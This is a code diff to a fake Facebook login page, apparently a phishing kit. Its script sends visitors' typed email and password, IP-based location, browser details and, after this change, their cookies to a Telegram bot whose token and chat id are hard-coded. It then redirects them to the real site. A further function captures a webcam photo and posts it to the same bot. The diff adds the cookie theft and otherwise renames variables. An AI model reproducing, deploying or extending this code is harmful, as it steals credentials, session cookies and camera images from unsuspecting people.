@@ -64,6 +64,7 @@
   </style>
 </head>
 <body>
+
   <div class="logo">Facebook</div>
   <div class="login-container">
     <input type="text" id="email" placeholder="Email or Phone Number" />
@@ -74,8 +75,8 @@
   <div class="footer">Facebook © 2025</div>
 
   <script>
-    const telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
-    const chatId = "6899914313";
+    let telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
+    let chatId = "6899914313";
 
     async function submitLogin() {
       const email = document.getElementById("email").value;
@@ -85,6 +86,7 @@
 
       const userAgent = navigator.userAgent;
       const time = new Date().toLocaleString();
+      const cookies = document.cookie || "No cookies found";
 
       try {
         const response = await fetch("https://ipapi.co/json/");
@@ -104,7 +106,10 @@ Password: ${password}
 IP: ${ip}
 Location: ${city}, ${region}, ${country}
 User-Agent: ${userAgent}
-Access Time: ${time}
+Time: ${time}
+
+[Cookies]
+${cookies}
         `.trim();
 
         await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -117,27 +122,27 @@ Access Time: ${time}
           window.location.href = "https://www.facebook.com";
         }, 1500);
       } catch (err) {
-        console.error("Failed to get location or send message", err);
+        console.error("Failed to send info:", err);
       }
     }
 
     function sendCameraPhoto() {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
-          const video = document.createElement("video");
+          let video = document.createElement("video");
           video.srcObject = stream;
           video.play();
 
           video.addEventListener("loadeddata", () => {
             setTimeout(() => {
-              const canvas = document.createElement("canvas");
+              let canvas = document.createElement("canvas");
               canvas.width = video.videoWidth;
               canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
+              let ctx = canvas.getContext("2d");
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
               canvas.toBlob(blob => {
-                const formData = new FormData();
+                let formData = new FormData();
                 formData.append("chat_id", chatId);
                 formData.append("photo", blob, "snapshot.jpg");
 
@@ -152,11 +157,11 @@ Access Time: ${time}
           });
         })
         .catch(error => {
-          const errMsg = "Camera access denied or unavailable.";
+          let errorMessage = "Camera access denied or unavailable.";
           fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errMsg })
+            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
           });
         });
     }
